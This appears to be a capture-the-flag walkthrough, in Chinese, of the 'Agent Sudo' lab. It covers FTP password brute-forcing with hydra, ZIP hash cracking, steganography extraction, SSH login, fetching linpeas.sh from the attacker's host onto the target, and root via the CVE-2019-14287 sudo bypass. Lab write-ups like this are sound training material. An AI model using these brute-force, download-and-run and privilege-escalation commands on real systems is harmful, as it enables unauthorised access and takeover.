
# Agent Sudo






掃描
```
rustscan -a 10.10.111.65 -- -A 


21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
```





web 查看
```
http://10.10.111.65/


Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```


修改 user-agent:
```
R
```


拿到
```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident

Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```



猜 A-C
```
C
```

跳轉:
```
http://10.10.111.65/agent_C_attention.php


Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 

```



hydra 爆破密碼
```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.111.65 -V


password: crystal
```





登入
```
ftp 10.10.111.65 21
```



下載所有檔案
```
mget *
```


移動到桌面
```
mv cutie.png cute-alien.jpg To_agentJ.txt /home/kali/Desktop/
```



查看檔案 To_agentJ.txt 
```
cat To_agentJ.txt 


Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```


exiftool 
```
exiftool cutie.png

沒找到
```



binwalk

```
binwalk cutie.png
檢測到壓縮檔中的To_agentR.txt



DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```



xxd 確認是否真的
```
xxd cutie.png | grep -i "To_agentR"

00008720: 546f 5f61 6765 6e74 522e 7478 7401 9907  To_agentR.txt...
```


binwalk -e 选项用于提取文件
```
binwalk -e cutie.png
```



進入目錄
```
cd _cutie.png.extracted/

-rw-r--r--  1 kali kali 279312 Jan  9 06:02 365
-rw-r--r--  1 kali kali  33973 Jan  9 06:02 365.zlib
-rw-r--r--  1 kali kali    280 Jan  9 06:02 8702.zip
-rw-r--r--  1 kali kali      0 Oct 29  2019 To_agentR.txt
```

解壓需要密碼
```
7z x 8702.zip
```


经过加密哈希算法处理后的值。在 Zip 文件加密中，密码哈希嵌入在文件头部
zip2john 工具能够识别 Zip 文件的加密信息，然后提取密码哈希。它会解析 Zip 文件的头部，找到密码哈希所在的位置，并将其提取出来。
```
zip2john 8702.zip > hash.txt


john hash.txt
john -show hash.txt

找到密碼
alien
```


使用u選項，不覆蓋同名檔案
```
7z e 8702.zip  
```



查看To_agentR_1.txt
```
cat To_agentR_1.txt

Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```



密碼 QXJlYTUx base64 decode
```
Area51
```





提取圖片中的文件message.txt
```
steghide extract -sf cute-alien.jpg

extract: 表示您希望从图像中提取隐藏的信息。
-sf: 表示后面跟随的是包含隐藏信息的图像文件的路径。

密碼:
Area51

wrote extracted data to "message.txt".
```


查看信息
```
cat message.txt 



Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```




SSH 登入
```
ssh james@10.10.111.65

密碼
hackerrules!
```



查看flag
```
cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7

```


下載圖片
```
scp james@10.10.111.65:/home/james/Alien_autospy.jpg /home/kali/Desktop/Alien_autospy.jpg
```


已圖搜圖找到
```
Roswell alien autopsy

```




ssh 登入
```
ssh james@10.10.114.51
hackerrules!
```



kali 下載linpeas.sh
```
curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```



受害者下載
```
php -S 0.0.0.0:80  
wget http://10.18.1.192/linpeas.sh
chmod +x linpeas.sh
```



CVE-2019-14287提權
```
sudo -u#-1 bash -u
```






